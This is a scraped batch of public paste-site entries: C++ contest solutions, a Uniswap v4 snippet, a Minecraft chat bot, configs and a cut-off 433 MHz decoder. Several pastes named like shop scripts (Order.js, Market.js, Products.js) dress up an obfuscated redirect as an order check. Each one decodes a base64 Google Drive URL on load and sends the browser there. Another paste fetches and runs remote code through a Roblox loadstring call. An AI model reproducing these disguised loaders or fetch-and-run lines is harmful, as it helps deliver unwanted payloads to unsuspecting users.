        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bAREWZfe,Untitled,M0MI4,JSON,Saturday 19th of April 2025 06:05:38 PM CDT,"{
  ""enabled"": true,
  ""title"": ""تنبيه جديد"",
  ""message"": ""aaa"",
  ""style"": ""inbox"",
""lines"": [""رسالة ١"", ""رسالة ٢"", ""مرحبا ٣""],
  ""sound"": true,
  ""vibrate"": true,
  ""expires"": ""2025-05-01T12:00:00"",
  ""image"": ""http://alo0osh-sy.yn.lt/images/-.jpg"",
  ""actions"": [
    {
      ""title"": ""فتح"",
      ""url"": ""https://example.com""
    },
    {
      ""title"": ""تجاهل""
    }
  ]
}

// StyleType: bigtext|bigpicture|inbox"
YGwLPbBU,Order.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 06:02:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23751/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iZH61ZAA,Redz Hub Premium,DatReaperCat,Lua,Saturday 19th of April 2025 05:55:48 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/CodeCrackerXGaming/NoxScripts/refs/heads/main/Redz%20Hub""))()"
tXYW7NsP,Broken createPosition implementation for uniswapv4,Nuclear_Man_D,JavaScript,Saturday 19th of April 2025 05:48:59 PM CDT,"
	function _createPosition2(PoolKey calldata key, uint160 sqrtRatioX96, uint160 sqrtRatioAX96, uint160 sqrtRatioBX96, uint128 liquidity) internal {

		// Calculate amounts of each token
        // I can't use LiquidityAmounts.getAmountsForLiquidity because the function does not exist in the v4
        // library.  See below links, there is a discrepency between the source and the documentation:
        //  https://docs.uniswap.org/contracts/v4/reference/core/libraries/liquidity-amounts
        //  https://github.com/Uniswap/v4-periphery/blob/main/src/libraries/LiquidityAmounts.sol
        // In any case, I included my own implementation in my utils contract:
        //  http://etherscan.io/address/0xC97B6F6DC641C0f59c724657B91569aF00C28B7D
        // It's based on the UniswapV3 code so I'm pretty sure it works fine.
		(uint256 amount0, uint256 amount1) = utils.getAmountsForLiquidity(sqrtRatioX96, sqrtRatioAX96, sqrtRatioBX96, liquidity);

		// This function reverts if the amounts of the tokens are less than amount0 and amount1 by the end of the call
        // From this, we can be sure that we have enough of the tokens, assuming that amount0 and amount1 are correct
		obtainTokens(Currency.unwrap(key.currency0), Currency.unwrap(key.currency1), amount0, amount1);

		// Grant allowance to the position manager
		if (Currency.unwrap(key.currency0) != address(0)) permit2.approve(Currency.unwrap(key.currency0), address(v4PositionManager), uint160(amount0), 0);
		permit2.approve(Currency.unwrap(key.currency1), address(v4PositionManager), uint160(amount1), 0);

		// Based on code from:
        // https://docs.uniswap.org/contracts/v4/quickstart/manage-liquidity/mint-position
        // https://docs.uniswap.org/contracts/v4/guides/position-manager
		bytes memory actions = abi.encodePacked(
			uint8(Actions.MINT_POSITION),
			uint8(Actions.SETTLE_PAIR)
		);
		bytes[] memory params = new bytes[](2);
		unchecked {
			params[0] = abi.encode(
				key,
				(TickMath.getTickAtSqrtPrice(sqrtRatioAX96) / key.tickSpacing) * key.tickSpacing,
				(TickMath.getTickAtSqrtPrice(sqrtRatioBX96) / key.tickSpacing) * key.tickSpacing,
				(liquidity * 1015) >> 10,  // reduces the inserted liquidity a bit, just in case we barely don't have enough 
				amount0,
				amount1,
				address(this),
				abi.encode(address(this))
			);
		}
		params[1] = abi.encode(key.currency0, key.currency1);

		unchecked {
			uint256 deadline = block.timestamp + 60;
			uint256 valueToPass = key.currency0.isAddressZero() ? amount0 : 0;

            // Our revert happens inside this call, apparently before SETTLE_PAIR is ever reached:
			v4PositionManager.modifyLiquidities{value: valueToPass}(abi.encode(actions, params), deadline);
		}
	}
"
aTbictcs,Market.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 05:47:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17533/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
waPtJ8T1,Untitled,Epiphemeral,JavaScript,Saturday 19th of April 2025 05:32:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/63858/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WyYiP9wC,mecontrol.lua,Saladd,Lua,Saturday 19th of April 2025 05:23:17 PM CDT,"-- Script to interact with ME Bridge via Chat Box commands
-- Version: 1.14 (Startup msg change, Purple brackets, + Prev Features)

-- ================== Configuration ==================
local allowedPrefixes = {
    ""!"",
    ""hey ada "" -- Lowercase for case-insensitive check
}
local initialAdminUser = ""YourMinecraftUsername"" -- !! SET THIS TO YOUR USERNAME !!
local userDbFilename = ""user_db.txt""
local listallFilename = ""item_list.txt""
local wisdomFilename = ""wisdoms.txt""
local wisdomPastebinId = ""wPKJMFkN""
local maxAmbiguityOptions = 3

-- Permission Levels
local LEVEL_ADMIN = ""admin""
local LEVEL_USER = ""user""

-- ================== Global Variables ==================
local users = {}
local itemNameLookup = nil
local displayNameLookup = nil
local wisdomList = {}
local buildError = nil
local chatBox = nil
local bridge = nil

-- ================== Helper Functions ==================

-- Updated reply function: Uses purple ""&5Ada&r"" prefix and purple brackets
local function reply(message)
  if chatBox then
    os.sleep(0.5)
    -- Use &5 for purple prefix name, &r to reset color after name.
    -- Add ""[]"" as brackets argument, and ""&5"" as bracketColor argument.
    chatBox.sendMessage(message, ""&5Ada&r"", ""[]"", ""&5"")
  else
    print(""Error: Chat Box not available."")
  end
end

-- (loadUsers, saveUsers, addToLookup, buildItemDatabase, resolveItemName, updateWisdomsFromPastebin, loadWisdoms functions remain the same as v1.11/v1.13 - condensed)
local function saveUsers() local sU,err=textutils.serialize(users);if not sU then print(""Serialize Err:""..(err or""?""));reply(""CRIT ERR:Save User Prep Fail."");return false end;local f,fE=fs.open(userDbFilename,""w"");if not f then print(""File Open Err:""..(fE or""?""));reply(""CRIT ERR:Save User DB Open Fail."");return false end;f.write(sU);f.close();print(""User DB saved."");return true end
local function loadUsers() if not fs.exists(userDbFilename)then print(""User DB ('""..userDbFilename..""') missing. Creating..."");users={};if initialAdminUser and initialAdminUser~=""""then print(""Adding admin:""..initialAdminUser);users[initialAdminUser]=LEVEL_ADMIN;if not saveUsers()then print(""CRIT:Fail initial save!"")end else print(""Warn:No initial admin."");reply(""Warn:User DB empty."")end;return end;local f,fE=fs.open(userDbFilename,""r"");if not f then print(""File Open Err:""..(fE or""?""));reply(""ERR:Load User DB Fail."");users={};return end;local sU=f.readAll();f.close();if sU==""""then print(""User DB empty."");users={};if initialAdminUser and initialAdminUser~=""""then users[initialAdminUser]=LEVEL_ADMIN;if not saveUsers()then print(""CRIT:Fail initial save!"")end end;return end;local ok,lD=pcall(textutils.unserialize,sU);if not ok or type(lD)~=""table""then print(""Unserialize Err:""..(lD or""?""));reply(""ERR:Load User Data Fail."");users={};else users=lD;print(""User DB loaded(""..table.maxn(users).."" users)."")end end
local function addToLookup(lS,lD,d) if d and d.name then local fN=d.name;local sN=fN:match("".*:(.+)""); local dN=d.displayName; if sN then sN=sN:lower();if not lS[sN]then lS[sN]={}end;local fS=false;for _,eN in ipairs(lS[sN])do if eN==fN then fS=true;break end end;if not fS then table.insert(lS[sN],fN)end end; if dN then dN=dN:lower():gsub(""^%s*%["",""""):gsub(""%]%s*$"",""""):gsub(""^%s*(.-)%s*$"",""%1"");if dN~=""""then if not lD[dN]then lD[dN]={}end;local fD=false;for _,eN in ipairs(lD[dN])do if eN==fN then fD=true;break end end;if not fD then table.insert(lD[dN],fN)end end end end end
local function buildItemDatabase(b) print(""Building DB..."");buildError=nil;local lS,lD,sC={},{},0; local sI,sE=b.listItems();if sI then print(""Proc stored..."");for _,d in ipairs(sI)do addToLookup(lS,lD,d)end;sC=sC+1 else print(""Warn:Stored fail:""..(sE or ""?""));buildError=(buildError and buildError..""; ""or"""")..""Fail stored"" end; local cI,cE=b.listCraftableItems();if cI then print(""Proc craftable..."");for _,d in ipairs(cI)do addToLookup(lS,lD,d)end;sC=sC+1 else print(""Warn:Craftable fail:""..(cE or ""?""));buildError=(buildError and buildError..""; ""or"""")..""Fail craftable"" end; if sC>0 then print(""DB built."");if sC==1 then print(""Warn:DB incomplete."")end else print(""Error:Failed DB build."")end;return lS,lD end
local function resolveItemName(uIn) if buildError and not itemNameLookup and not displayNameLookup then return nil,""DB build fail:""..buildError end;if not itemNameLookup or not displayNameLookup then return nil,""Item DB not built/empty.""end;if uIn:find("":"")then return uIn,nil end;local iL=uIn:lower();local sM=itemNameLookup[iL];if sM and #sM==1 then return sM[1],nil end;local dM=displayNameLookup[iL];if dM and #dM==1 then return dM[1],nil end;local cmb,add={}, {};if sM then for _,n in ipairs(sM)do if not add[n]then table.insert(cmb,n);add[n]=true end end end;if dM then for _,n in ipairs(dM)do if not add[n]then table.insert(cmb,n);add[n]=true end end end;if #cmb==0 then return nil,""Item '""..uIn..""' not found.""elseif #cmb==1 then return cmb[1],nil else local p={};for i=1,math.min(#cmb,maxAmbiguityOptions)do table.insert(p,cmb[i])end;local msg=""Ambiguous:'""..uIn..""'. Try:""..table.concat(p,"", "").."". Be specific."";return nil,msg end end
local function updateWisdomsFromPastebin() if not wisdomPastebinId or wisdomPastebinId==""""or wisdomPastebinId==""YOUR_ID_HERE""then print(""Pastebin ID skip."");return false,""Pastebin ID not set.""end; local tmp=""wisdom_temp.txt"";print(""Downloading wisdom ""..wisdomPastebinId..""...""); if not http then print(""ERR:HTTP disabled."");return false,""HTTP disabled.""end; local ok=shell.run(""pastebin"",""get"",wisdomPastebinId,tmp); if not ok then print(""ERR:Pastebin DL fail."");fs.delete(tmp);return false,""Pastebin DL fail.""end; print(""DL OK. Appending...""); local tmpF,tmpE=fs.open(tmp,""r""); if not tmpF then print(""ERR open tmp:""..(tmpE or""?""));fs.delete(tmp);return false,""Open DL fail.""end; local mainF,mainE=fs.open(wisdomFilename,""a""); if not mainF then print(""ERR open main:""..(mainE or""?""));tmpF.close();fs.delete(tmp);return false,""Open wisdom fail.""end; local lines=0; while true do local l=tmpF.readLine();if l==nil then break end;l=l:match(""^%s*(.-)%s*$"");if l~=""""then mainF.writeLine(l);lines=lines+1 end end; mainF.close();tmpF.close();fs.delete(tmp);print(""Appended ""..lines.."" wisdoms.""); return true,""Appended ""..lines.."" wisdoms."" end
local function loadWisdoms() print(""Loading wisdoms from ""..wisdomFilename..""..."");wisdomList={}; if not fs.exists(wisdomFilename)then print(""Warn:Wisdom file missing."");reply(""Warn:wisdoms.txt missing."");return end; local f,err=fs.open(wisdomFilename,""r"");if not f then print(""Err open wisdom:""..(err or""?""));reply(""Err:Open wisdom fail."");return end; local lN=0;while true do local l=f.readLine();if l==nil then break end;l=l:match(""^%s*(.-)%s*$"");if l~=""""then table.insert(wisdomList,l);lN=lN+1 end end;f.close();print(""Loaded ""..lN.."" wisdoms."");if lN==0 then reply(""Warn:wisdoms.txt empty."")end end

-- ================== Main Script Execution ==================

print(""Ada Script Initializing..."") -- Changed name here too
print(""Attempting to find peripherals..."")
chatBox = peripheral.find(""chatBox"")
bridge = peripheral.find(""meBridge"")
if not chatBox then print(""CRIT ERR: Chat Box not found!""); return end
if not bridge then print(""CRIT ERR: ME Bridge not found!""); reply(""CRIT ERR: ME Bridge not found.""); return end
print(""Peripherals found successfully."")
loadUsers()
local updated, updateMsg = updateWisdomsFromPastebin(); if not updated then reply(""Warn: Wisdom update fail: "" .. updateMsg) end
itemNameLookup, displayNameLookup = buildItemDatabase(bridge)
loadWisdoms()
if buildError then reply(""Warning: "" .. buildError .. "". Name resolution may fail."") end

print(""Initialization complete. Listening..."")
-- *** CHANGED Startup Message ***
reply(""All Systems running."" .. (buildError and "" (Warning: Item DB incomplete)"" or """")) -- Public reply

-- ================== Main Event Loop ==================
while true do
  local eventData = {os.pullEvent()}
  local eventType = eventData[1]

  if eventType == ""chat"" then
    local username=eventData[2]; local message=eventData[3]; local isHidden=eventData[5]

    if not isHidden then
      local matchedPrefix = nil; local originalMatchedPrefix = nil
      local messageLower = message:lower()
      for _, prefix in ipairs(allowedPrefixes) do
          if messageLower:sub(1, #prefix) == prefix:lower() then
              matchedPrefix = prefix:lower(); originalMatchedPrefix = prefix; break
          end
      end

      if matchedPrefix then
          if not users[username] then print(""Denied unregistered: ""..username); reply(""Access Denied.""); goto continue end
          local userLevel = users[username]; print(""Cmd '"" .. message .. ""' from "" .. username .. "" ("" .. userLevel .. "")"")
          local commandPart = message:sub(#originalMatchedPrefix + 1)
          local cmdName = commandPart:match(""^%s*([^%s]+)"") or """"; cmdName = cmdName:lower()
          local remainingArgs = commandPart:match(""^%s*[^%s]+%s+(.*)"") or """"

          -- === Command Handling ===
          if cmdName == ""help"" then local hM=""Cmds: help, status, list <item>, listall, craft <#><item>, iscraftable <item>, rebuilddb, wisdom""; if userLevel==LEVEL_ADMIN then hM=hM.."", user <add|rm|list>, updatewisdoms"" end; reply(hM)
          -- Admin commands
          elseif cmdName == ""user"" then if userLevel~=LEVEL_ADMIN then reply(""Perm Denied: Admin."") else local sC=remainingArgs:match(""^%s*([^%s]+)"")or""""; local sA=remainingArgs:match(""^%s*[^%s]+%s+(.*)"")or""""; sC=sC:lower(); if sC==""add"" then local n,l=sA:match(""^%s*([^%s]+)""),sA:match(""^%s*[^%s]+%s+([^%s]+)"")or LEVEL_USER; l=l:lower(); if not n then reply(""Use: user add <n> [admin|user]"")elseif l~=LEVEL_ADMIN and l~=LEVEL_USER then reply(""Bad lvl."")elseif users[n] then reply(""User exists."")else users[n]=l;if saveUsers()then reply(""User ""..n.."" added(""..l.."")."")else reply(""ERR: Save fail."");users[n]=nil end end elseif sC==""remove"" then local n=sA:match(""^%s*([^%s]+)""); if not n then reply(""Use: user rm <n>"")elseif not users[n] then reply(""User not found."")else local aC=0;for _,l in pairs(users)do if l==LEVEL_ADMIN then aC=aC+1 end end;if users[n]==LEVEL_ADMIN and aC<=1 then reply(""Cannot remove last admin."")else users[n]=nil;if saveUsers()then reply(""User ""..n.."" removed."")else reply(""ERR: Save fail."");users[n]=""error""end end end elseif sC==""list"" then local uL=""Users:\n"";local c=0;for n,l in pairs(users)do uL=uL..""- ""..n..""(""..l.."")\n"";c=c+1 end;if c==0 then reply(""No users."")else reply(uL)end else reply(""Use: user <add|rm|list>"") end end
          elseif cmdName == ""updatewisdoms"" then if userLevel~=LEVEL_ADMIN then reply(""Perm Denied: Admin."") else reply(""Attempting manual wisdom update...""); local ok, msg = updateWisdomsFromPastebin(); if ok then loadWisdoms(); reply(""Wisdom update finished: "" .. msg) else reply(""Wisdom update failed: "" .. msg) end end
          -- User commands
          elseif cmdName == ""wisdom"" then if #wisdomList>0 then local rI=math.random(1,#wisdomList); reply(wisdomList[rI]) else reply(""No wisdom found."") end -- Removed ""Ada says: ""
          elseif cmdName == ""listall"" then print(""Getting items...""); reply(""Saving list to "" .. listallFilename); local allItems,err=bridge.listItems(); if allItems then local file,fE=fs.open(listallFilename,""w""); if not file then print(""Err open: ""..(fE or ""?"")); reply(""Err saving."") else print(""Saving...""); file.writeLine(""--- Item List ---""); for _,d in ipairs(allItems) do file.writeLine(string.format(""N:%s|DN:%s|A:%d"",d.name or ""?"",d.displayName or ""?"",d.amount or 0)) end; file.writeLine(""--- End List ---""); file.close(); print(""Saved.""); reply(""Saved list."") end else print(""Err list: ""..(err or ""?"")); reply(""Err listing."") end
          elseif cmdName == ""rebuilddb"" then reply(""Rebuilding DB...""); itemNameLookup, displayNameLookup = buildItemDatabase(bridge); if buildError then reply(""Warn: ""..buildError) else reply(""DB rebuilt."") end
          elseif cmdName == ""status"" then local e,mE,u,iS,iT=bridge.getEnergyStorage(),bridge.getMaxEnergyStorage(),bridge.getEnergyUsage(),bridge.getUsedItemStorage(),bridge.getTotalItemStorage(); reply(string.format(""AE2 Status|E:%s/%s|Use:%s|Items:%s/%s bytes"",tostring(e or ""?""),tostring(mE or ""?""),tostring(u or ""?""),tostring(iS or ""?""),tostring(iT or ""?"")))
          elseif (cmdName==""list"" or cmdName==""iscraftable"") and remainingArgs~="""" then local uIn=remainingArgs; local rN,rE=resolveItemName(uIn); if not rN then reply(rE or ""Resolve failed."") else if cmdName==""list"" then local iD,err=bridge.getItem({name=rN}); if iD then reply(string.format(""Item:%s(C:%s)Amt:%d(WARN!)"",iD.displayName or rN,tostring(iD.isCraftable),(iD.amount or 0))) else local cr,cErr=bridge.isItemCraftable({name=rN}); if cr then reply(string.format(""Item:%s(C:true)Amt:0(WARN!)"",rN)) else reply(""Item '""..rN..""' not found/err: ""..(err or cErr or ""?"")) end end elseif cmdName==""iscraftable"" then local cr,err=bridge.isItemCraftable({name=rN}); if err then reply(""Err check ""..rN.."": ""..err) else reply(rN.."" is ""..(cr and ""craftable"" or ""not craftable"")) end end end
          elseif cmdName == ""craft"" then local count=tonumber(remainingArgs:match(""^%s*(%d+)%s+"")); local uIn=remainingArgs:match(""^%s*%d+%s+(.*)""); if not count or not uIn or uIn=="""" then reply(""Use: !craft <#> <item>"") else local rN,rE=resolveItemName(uIn); if not rN then reply(rE or ""Resolve failed."") elseif count<=0 then reply(""Bad count."") else reply(""Crafting ""..count.."" ""..rN..""...""); os.sleep(0.1); local s,m=bridge.craftItem({name=rN,count=count}); if s then reply(""Job started."") else reply(""Job failed: ""..(m or ""?"")) end end end
          else reply(""Unknown cmd/args. Use '"" .. (allowedPrefixes[1]:lower() or ""?"") .. ""help'."") end
      end -- end if matchedPrefix
    end -- end if not isHidden
  end -- end if eventType == ""chat""
  ::continue::
end"
iCgdJfDL,Products.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 05:16:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17865/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NVB6jWUU,Goldilocks (coordinate compression),Vince14,C++,Saturday 19th of April 2025 05:08:29 PM CDT,"#include <iostream>
#include <string>
#include <cstring>
#include <algorithm>
#include <cmath>
#include <regex>
#include <vector>
#include <set>
#include <map>
#include <stack>
#include <queue>
#include <deque>
#include <unordered_map>
#include <numeric>
#include <iomanip>
using namespace std;
#define pii pair<int, int>
#define ll long long
#define FAST ios_base::sync_with_stdio(false); cin.tie(NULL)
#define mp(x1, x2) ( make_pair(x1, x2) )
const int dx[4] = {1, 0, 0, -1}, dy[4] = {0, 1, -1, 0};
const int dl[2] = {1, -1};
const int MOD = 100000007;
const int MAXN = 202020;

int n, x, y, z;
pii arr[MAXN];
vector<int> v;
int changes[MAXN * 3];
int milk[MAXN * 3];

int main(){
    FAST;
    //freopen(""milktemp.in"", ""r"", stdin);
    //freopen(""milktemp.out"", ""w"", stdout);
    cin >> n >> x >> y >> z;
    for (int i = 0; i < n; i++) {
        cin >> arr[i].first >> arr[i].second;
        arr[i].second++;
        v.push_back(arr[i].first);
        v.push_back(arr[i].second);
    }
    sort(v.begin(), v.end());
    v.erase(unique(v.begin(), v.end()), v.end());
    for (int i = 0; i < n; i++) {
        arr[i].first = lower_bound(v.begin(), v.end(), arr[i].first) - v.begin();
        arr[i].second = lower_bound(v.begin(), v.end(), arr[i].second) - v.begin();
        changes[arr[i].first] += y - x;
        changes[arr[i].second] += z - y;
    }
    milk[0] = x * n + changes[0];
    //cout << milk[0] << endl;
    int ans = milk[0];
    for (int i = 1; i < 3 * n; i++) {
        milk[i] = milk[i - 1] + changes[i];
        ans = max(ans, milk[i]);
        //cout << i << "" "" << milk[i] << endl;
    }
    cout << ans << endl;
}
"
QaxWXSx9,Combination Lock,Vince14,C++,Saturday 19th of April 2025 05:06:59 PM CDT,"#include <iostream>
#include <cstdio>
#include <string>
#include <cstring>
#include <algorithm>
#include <cmath>
#include <regex>
#include <vector>
#include <set>
#include <map>
#include <stack>
#include <queue>
#include <deque>
#include <unordered_map>
#include <numeric>
#include <iomanip>
using namespace std;
#define pii pair<int, int>
#define ll long long
#define FAST ios_base::sync_with_stdio(false); cin.tie(NULL)
#define mp(x1, x2) ( make_pair(x1, x2) )
const int dx[4] = {1, 0, 0, -1}, dy[4] = {0, 1, -1, 0};
const int dl[2] = {1, -1};
const int MOD = 100000007;
const int MAXN = 100;

int n;
int x, y, z;
int a, b, c;
int ans = 0;

bool check(int xx, int yy) {
    if (abs(xx - yy) <= 2) return true;
    if (abs(xx - yy) == n - 1 or abs(xx -yy) == n - 2) return true;
    return false;
}
int main(){
    FAST;
    //freopen(""combo.in"", ""r"", stdin);
    //freopen(""combo.out"", ""w"", stdout);
    cin >> n;
    cin >> x >> y >> z;
    cin >> a >> b >> c;
    for (int i = 1; i <= n; i++) {
        for (int j = 1; j <= n; j++) {
            for (int k = 1; k <= n; k++) {
                if ((check(x, i) and check(y, j) and check(z, k)) or
                    (check(a, i) and check(b, j) and check(c, k))) {
                    // cout << i << "" "" << j << "" "" << k << ""\n"";
                    ans++;
                }
            }
        }
    }
    cout << ans << ""\n"";
}
"
etj7t5YM,Order.js,Epiphemeral,JavaScript,Saturday 19th of April 2025 05:01:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43297/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mCxpnsdm,CodinIDE Update Api,Lizalovv,JSON,Saturday 19th of April 2025 04:58:26 PM CDT,"{
  ""version"": ""1.0.2"",
  ""download_url"": ""https://github.com/mrcutex/CodinIDE/releases/download/CodinIDE/CodinIDE_1.0.apk"",
  ""force_update"": true
}"
9nefzJcU,433mhz,orborbson,Python,Saturday 19th of April 2025 04:53:36 PM CDT,"import esp32, machine, math, time, gc, sys
import ssd1306

@micropython.native
class signals:
    def __init__(self, nums, min_signals = 20, threshold = 1.5, tolerance_in_percent = 50):
        self._nums = nums[0]
        self._initial_state = nums[1]
        self._nums_size = len(nums[0])
        self._min_signals = min_signals
        self._threshold = threshold
        self._tolerance_in_percent = tolerance_in_percent / 100
        self._split_sig = []
        self._dict_sig = {}
        
    def _average(self):
        return sum(self._nums) / self._nums_size

    def _standard_deviation(self):
        avg = self._average()
        variance = sum((x - avg) ** 2 for x in self._nums) / self._nums_size
        return math.sqrt(variance)
    
    def _detect_outliers(self):
        avg = self._average()
        sd = self._standard_deviation()
        return [idx for idx, var in enumerate(self._nums) if abs(var - avg) > self._threshold * sd]
    
    def _split_signals(self):
        spikes = self._detect_outliers()
        big = {}
        start_idx = 0
        #print(self._nums)
        #print(""spikes: "", spikes)
        for idx in spikes:
            signal_length = idx - start_idx
            if signal_length >= self._min_signals:
                if signal_length in big:
                    big[signal_length] += 1
                else:
                    big[signal_length] = 1
            start_idx = idx
        
        start_idx = 0
        if len(big):
            freq = max(big, key = big.get)
            for idx in spikes:
                signal_length = idx - start_idx
                if signal_length == freq:
                    self._split_sig.append(self._nums[start_idx: idx])
                start_idx = idx
   
    def _compare_lists(self, list1, list2):
        if len(list1) != len(list2):
            return False
        for a, b in zip(list1, list2):
            if abs(a - b) > a * self._tolerance_in_percent:
                return False
        return True
        
    def _group_and_average(self):
        groups = {}
        group_id = 0
        for i, list1 in enumerate(self._split_sig):
            found_group = False
            for group_key, group_indices in groups.items():
                if self._compare_lists(list1, self._split_sig[group_indices[0]]):
                    groups[group_key].append(i)
                    found_group = True
                    break
            if not found_group:
                groups[group_id] = [i]
                group_id += 1
        #print(groups)
        result = {}
        for group_key, group_indices in groups.items():
            group_lists = [self._split_sig[i] for i in group_indices]
            #print(""group lists:"", group_lists)
            averages = [sum(values) // len(values) for values in zip(*group_lists)]
            self._dict_sig[group_key] = averages
            
    def return_unique_signals(self):
        self._split_signals()
        self._group_and_average()
        return self._dict_sig
    
def bity_na_int(lista_bitow):
    x = 0
    for bit in lista_bitow:
        x = x * 2 + bit
    return x
    
def sygnaly_na_hex(x):
    sygnaly = x[:]
    prog = sum(sygnaly)/len(sygnaly) # średnia dla sygnałów
    bity = [1 if s > prog else 0 for s in sygnaly] # zamieniam sygnały na bity bazując na progu
    hex_lista = [(""%.2X"" % bity_na_int(bity[i : i + 8])) for i in range(0, len(bity), 8)] # tworzę liste hex-ów
    return """".join(hex_lista) # lista -> str

# ==============================================================

